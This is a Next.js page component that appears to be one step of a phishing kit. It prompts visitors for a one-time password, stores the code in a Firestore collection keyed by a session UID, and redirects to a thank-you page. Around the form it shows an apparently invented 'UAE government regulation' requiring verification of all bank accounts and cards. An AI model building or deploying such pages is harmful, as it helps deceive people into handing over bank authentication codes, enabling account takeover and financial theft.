"use client"

import type React from "react"
import { useState, useEffect } from "react"
import Image from "next/image"
import Header from '../components/Header'
import Footer from '../components/Footer'
import { doc, setDoc, serverTimestamp } from "firebase/firestore"
import { db } from "../../lib/firebase"
import { useRouter, useSearchParams } from 'next/navigation'

export default function OTPVerification() {
  const [otpCode, setOtpCode] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [message, setMessage] = useState("")
  const [uid, setUid] = useState("")
  const router = useRouter()
  const searchParams = useSearchParams()

  useEffect(() => {
    // Get UID from URL parameters
    const urlUid = searchParams.get('uid')
    if (urlUid) {
      setUid(urlUid)
      console.log("Received UID from URL:", urlUid)
    } else {
      setMessage("Error: No user session found. Please start from the beginning.")
    }
  }, [searchParams])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setMessage("")

    // Check if UID is available
    if (!uid) {
      setMessage("Error: No user session found. Please start from the beginning.")
      setIsLoading(false)
      return
    }

    // Check if OTP code is provided
    if (!otpCode.trim()) {
      setMessage("Please enter the OTP code")
      setIsLoading(false)
      return
    }

    try {
      console.log("Attempting to store data in Firestore...")
      console.log("UID:", uid)
      console.log("OTP Code:", otpCode)

      // Store OTP data in "users" database, document "eighthform", with UID as field name
      const eighthformDocRef = doc(db, "users", "eighthform")
      
      const dataToStore = {
        [uid]: {
          otpCode: otpCode,
          uid: uid,
          createdAt: serverTimestamp(),
          status: "completed",
          step: "otpVerification5"
        }
      }

      console.log("Data to store:", dataToStore)

      await setDoc(eighthformDocRef, dataToStore, { merge: true })

      console.log("OTP submitted successfully:", otpCode)
      console.log("Data stored with UID: ", uid)
      
      setMessage("OTP submitted successfully!")
      
      // Navigate to thankyou page with the same UID
      setTimeout(() => {
        router.push(`/thankyou?uid=${uid}`)
      }, 1000)

    } catch (error: any) {
      console.error("Firestore Error:", error)
      console.error("Error code:", error.code)
      console.error("Error message:", error.message)
      
      let errorMessage = "Error submitting OTP. Please try again."
      
      // More specific error messages
      if (error.code === 'permission-denied') {
        errorMessage = "Permission denied. Please check Firestore security rules."
      } else if (error.code === 'unavailable') {
        errorMessage = "Network error. Please check your internet connection."
      } else if (error.code === 'invalid-argument') {
        errorMessage = "Invalid data. Please check the data you're trying to store."
      }
      
      setMessage(errorMessage)
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <>
      <Header />
      <div className="min-h-screen bg-slate-100 flex flex-col items-center justify-start px-4 py-8 ">
        {/* Main Container */}
        <div className="w-full max-w-[550] mt-40">
          <div className="mb-8 bg-[#D1E7DD] border border-[#D1E7DD] rounded-lg p-4 text-center">
          <p className="text-slate-800 font-semibold text-xl flex items-center justify-center gap-2">
            ✅ Your verification is successfully verified. Now you can use your services.
          </p>
        </div>
          {/* Information Card */}
          <div className="bg-white rounded-2xl shadow-lg p-16 mt-20 mb-30">
            <div className="mb-6">
              <h2 className="text-2xl font-bold text-[#B48B5E] text-center mb-3">
                Mandatory Verification of Bank Accounts and Payment Cards
              </h2>
              <div className="h-0.5 bg-[#B48B5E] w-105 mx-0"></div>
            </div>

            <div className="space-y-10 text-xl text-slate-700 leading-relaxed">
              <p>
                The United Arab Emirates (UAE) has implemented a new regulation mandating that all bank accounts, debit
                cards, and credit cards must undergo verification by the specified deadline set by the UAE government.
                This measure aims to enhance financial security and ensure compliance with regulatory standards.
              </p>

              <div>
                <p className="font-semibold text-slate-900 mb-2">Formal Statement:</p>
                <p className="italic">
                  "In accordance with the latest financial security measures, the UAE government has introduced a new
                  regulation requiring the verification of all bank accounts, debit cards, and credit cards issued within
                  the UAE. This regulation is part of the ongoing efforts to enhance the integrity and security of the
                  financial system."
                </p>
              </div>

              <p>
                The UAE government urges all residents and businesses to cooperate with their financial institutions and
                complete the verification process promptly to avoid service disruptions.
              </p>
            </div>
          </div>

          {/* Debug info - you can remove this in production */}
          
        </div>
      </div>
      <Footer />
    </>
  )
}